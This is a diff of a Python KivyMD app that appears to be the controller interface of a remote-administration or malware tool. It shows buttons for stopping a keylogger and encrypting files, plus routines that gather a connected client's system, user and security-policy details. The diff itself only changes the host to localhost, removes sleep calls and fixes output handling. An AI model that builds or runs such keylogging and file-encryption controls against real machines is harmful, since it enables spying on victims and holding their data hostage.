@@ -123,7 +123,7 @@ ScreenManager:
                     id: keyloggerstopBtn
                     text: "Key Logger Stop"
                     on_press: app.KeyloggerStop()
-                    
+
                 OneLineListItem:
                     id: encryptfilesBtn
                     text: "Encrypt Files"
@@ -157,7 +157,7 @@ ScreenManager:
         hint_text: 'Enter File Path'
 '''
 # Server IP and Port
-HOST = '192.168.123.165'  # Temporary localhost for testing (Make sure to use the client's IP during production
+HOST = '127.0.0.1'  # Temporary localhost for testing (Make sure to use the client's IP during production
 PORT = 21420
 
 
@@ -197,7 +197,6 @@ class Main(MDApp):
     # This is to gather the client's information about their network
     def NetworkInfo(self):
         while True:
-            time.sleep(1)
             # Reset console
             self.root.ids.consoleField.text = ''
 
@@ -216,7 +215,6 @@ class Main(MDApp):
     # Gather Operating System Information
     def OSInfo(self):
         while True:
-            time.sleep(1)
             # Reset console
             self.root.ids.consoleField.text = ''
 
@@ -251,7 +249,6 @@ class Main(MDApp):
 
     def GpuInfo(self):
         while True:
-            time.sleep(1)
             # Reset console
             self.root.ids.consoleField.text = ''
 
@@ -289,7 +286,6 @@ class Main(MDApp):
     # Get the % of CPU Utilization
     def CpuUsage(self):
         while True:
-            time.sleep(1)
             # Reset console
             self.root.ids.consoleField.text = ''
 
@@ -307,7 +303,6 @@ class Main(MDApp):
     # Get current running tasks
     def Tasks(self):
         while True:
-            time.sleep(1)
             # Reset console
             self.root.ids.consoleField.text = ''
 
@@ -327,7 +322,6 @@ class Main(MDApp):
     # Get current running services
     def Services(self):
         while True:
-            time.sleep(1)
             # Reset console
             self.root.ids.consoleField.text = ''
 
@@ -345,7 +339,6 @@ class Main(MDApp):
     # Get security policy
     def SecPolicy(self):
         while True:
-            time.sleep(1)
             # Reset console
             self.root.ids.consoleField.text = ''
 
@@ -363,7 +356,6 @@ class Main(MDApp):
     # Get memory information
     def MemInfo(self):
         while True:
-            time.sleep(1)
             # Reset console
             self.root.ids.consoleField.text = ''
 
@@ -399,7 +391,6 @@ class Main(MDApp):
     # Fang's stuffz
     def UserInfo(self):
         while True:
-            time.sleep(1)
             # Reset console
             self.root.ids.consoleField.text = ''
 
@@ -420,10 +411,11 @@ class Main(MDApp):
 
             # Print results
             print('Output: ')
-            print(f"{output[0]}\n{output[1]}\n{output[8]}")
-            print(f"SID\t\t\t\t\t\t\t{output2[2]}")
+            a1= f"{output[0]}\n{output[1]}\n{output[8]}"
+            print(a1)
+            a2 = f"SID\t\t\t\t\t\t\t{output2[2]}"
 
-            self.root.ids.consoleField.text = output + output2
+            self.root.ids.consoleField.text = a1 + a2
             break
 
     ###############################DISRUPTIONS############################################
